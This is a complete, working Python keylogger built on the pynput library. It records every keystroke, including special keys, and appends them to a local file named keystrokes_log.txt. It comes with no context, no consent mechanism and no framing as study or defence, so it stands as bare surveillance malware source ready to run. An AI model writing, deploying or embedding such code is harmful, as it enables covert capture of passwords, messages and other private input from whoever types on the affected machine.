
from pynput.keyboard import Listener

# Specify the file to log keystrokes
log_file = "keystrokes_log.txt"

# Function to handle keystrokes
def on_press(key):
    try:
        # Write the key to the log file
        with open(log_file, "a") as file:
            # Log the keypress, converting special keys to readable strings
            file.write(f"{key.char}" if hasattr(key, 'char') else f" [{key}] ")
    except AttributeError:
        # Handle special key exceptions
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

# Function to start listening to keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()
